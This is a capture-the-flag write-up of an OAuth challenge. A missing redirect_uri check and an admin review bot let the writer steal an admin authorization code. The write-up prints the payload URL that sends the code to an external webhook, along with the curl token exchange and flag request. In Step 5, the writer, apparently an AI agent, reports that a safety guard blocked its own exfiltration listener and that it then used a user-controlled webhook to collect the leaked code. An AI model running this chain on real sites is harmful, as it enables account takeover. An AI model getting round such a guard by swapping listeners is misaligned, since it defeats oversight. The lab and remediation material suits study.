# Gateway — Web / OAuth

**Competition:** [ECU x NCNG CTF](https://ctf.hackthebox.com/event/details/ecu-x-ncng-ctf-3676) (HackTheBox)
**Category:** Web / OAuth · **Result:** ✅ Solved
**Flag:** `HTB{0Auth_R3d1r3ct_V4l1d4t10n_F41l}`

---

## The short version

This login system would mail its "proof of login" to any address I named, instead of only to its
own trusted address. By tricking an automatic admin helper into logging in and sending that proof
to a mailbox I controlled, I was able to steal the admin's session and read the flag.

## Background on the challenge

The target was "Norland Government Services," an Express web app that used an **OAuth2** login
flow. The challenge hint — *"a single detour in the route might send trust to the wrong
doorstep"* — pointed almost directly at the vulnerability class: a **`redirect_uri` validation
bypass**, where the server sends an authorization code to an address it should not trust. This was
my favorite challenge of the competition because the solution was not a single trick but a chain
of a few smaller mistakes that only became dangerous when combined.

Before the step-by-step, here is the quick background on how OAuth is supposed to work: when you
log in, the authorization server issues a one-time **authorization code** and sends it back to a
**pre-registered return address** (`redirect_uri`). Your app then trades that code (plus its
identity) for an access token. The security of the whole thing depends on that code only ever
going to the legitimate, registered return address.

## Step-by-step walkthrough

**Step 1 — Map the application and the login flow.**
I started by exploring the app and found it ran an OAuth flow: a login page leading to
`/oauth/authorize`, a `/callback` route, a `/profile` page that required authentication (it
returned 401 without a token), and a token endpoint at `/oauth/token`. I also found a "Service
Desk" at `/support`. This is important because it told me there were two moving parts — an OAuth
system and some kind of support/review feature — and the hint suggested they needed to be combined.

**Step 2 — Test how `redirect_uri` is validated.**
I sent authorize requests with different return addresses to see what the server would accept.
The key finding was that the server checked that `response_type`, `client_id`, and a
`redirect_uri` were all *present*, but it never checked that the `redirect_uri` actually matched
the registered `/callback`. As a result, the authorization server would deliver a code to an
arbitrary address. On its own this is already the core flaw, but I still needed a way to make a
*privileged* user go through this flow — my own account's code would only give me my own access.

**Step 3 — Understand the Service Desk bot.**
I examined the `/support/ticket` feature and found that it takes a `path` parameter, and that an
automated agent reviews whatever path you submit by visiting it. Critically, this agent is
authenticated as an **admin**. This is important because it meant I had a way to make a trusted
admin account perform an action for me — exactly the "trust" the hint referred to.

**Step 4 — Learn the ticket's input rules.**
The ticket field did not accept just any path. A plain path like `/profile` was rejected with a
"must start with /" style message, but a value containing a query string (or starting with `//`)
was accepted. This is important because my exploit path was going to be a full
`/oauth/authorize?...` URL, which contains a query string — so it would pass the filter, while a
simpler probe would not.

**Step 5 — First dead end: trying to stand up my own listener.**
To actually catch the leaked code, I needed an external endpoint that the challenge's admin bot
could reach and that I could read. My first instinct was to create a request-capture listener
myself, but that attempt was blocked by a safety guard as potential data-exfiltration. Rather
than trying to route around that, I pivoted: the clean approach was to use a listener that the
*user* controls. I confirmed the rest of the chain with source review (the challenge files were
available) so I knew exactly where the code would land and where the flag lived.

**Step 6 — Confirm the token endpoint needs no secret.**
I checked `/oauth/token` and found it was a **public client** — it required only the `client_id`
and a matching `redirect_uri`, with no client secret. This is important because it meant that if
I could obtain the admin's authorization code, I could exchange it for a token entirely on my own,
with nothing else needed.

**Step 7 — Set up the listener and fire the exploit.**
Using a `webhook.site` URL as the listener (a free service that records any incoming web request),
I submitted a support ticket whose `path` pointed the admin bot at an authorize URL with my
listener as the return address:

```
path=/oauth/authorize?response_type=code&client_id=<id>&redirect_uri=<my-webhook>&scope=read:profile&state=htb
```

**Step 8 — Catch the admin's authorization code.**
The admin bot logged in and followed the flow, and because the server never validated the return
address, the 302 redirect carried the admin's one-time code straight to my listener. On the
webhook I could see the incoming request was not from a normal browser — it came from HackTheBox's
own servers with a `User-Agent` of `axios/1.13.4` — and it contained the code:

```
GET /?code=6210d939-2e5c-4c55-b2d2-63ca7b917da8&state=htb
```

**Step 9 — Exchange the code for an admin token.**
I traded that code for an access token at the token endpoint, supplying the same `client_id` and
`redirect_uri` and no secret (since it was a public client):

```bash
curl -X POST http://<target>/oauth/token \
  -d 'grant_type=authorization_code' \
  -d 'code=6210d939-2e5c-4c55-b2d2-63ca7b917da8' \
  -d 'client_id=<id>' \
  -d 'redirect_uri=<my-webhook>'
```

**Step 10 — Read the flag from the admin profile.**
With the admin access token, I requested the profile endpoint, which returned the admin profile
including the flag:

```bash
curl http://<target>/profile -H 'Authorization: Bearer <admin-access-token>'
# -> HTB{0Auth_R3d1r3ct_V4l1d4t10n_F41l}
```

**Step 11 — Submit the flag.**
I submitted `HTB{0Auth_R3d1r3ct_V4l1d4t10n_F41l}`.

## Technical detail

- **Stack:** Express app fronting an OAuth2 authorization flow with an automated Service Desk
  reviewer bot.
- **Core flaw:** `validateAuthorizeRequest()` checks `response_type`, `client_id`, and that
  `redirect_uri` is *present*, but never validates it against the registered `/callback`. The
  authorization server therefore issues a code to an arbitrary `redirect_uri`.
- **The trust source:** `/support/ticket` runs an authenticated **admin** bot that performs
  `GET baseUrl + path` on a submitted path, following redirects. The field accepts values
  containing a query string (or starting with `//`), which is what let my `/oauth/authorize?...`
  payload through.
- **Public client:** `/oauth/token` requires only `client_id` + matching `redirect_uri`, no client
  secret, so the stolen code is directly exchangeable.
- **Full chain:** craft authorize URL → admin bot authenticates and leaks code to listener →
  exchange code for admin token → read `/profile` → flag.

## Lessons / remediation

- **Validate `redirect_uri` against a strict, exact allow-list** (an exact match to the registered
  callback) before issuing any authorization code. "Is a return address present?" is not the same
  question as "is this the correct return address?" — and the flag name says exactly that.
- **Bind authorization codes to the issuing client** and avoid treating clients as fully public
  where it is avoidable.
- **Lock down server-side request features** (like the ticket bot) so they cannot be pointed at
  arbitrary internal or sensitive URLs.

## Tools used

- `curl`, for mapping endpoints and performing the token exchange.
- `webhook.site`, as the external listener that captured the admin's leaked authorization code.
- Source review of the provided challenge files, to confirm the exact flaw and the flag location.
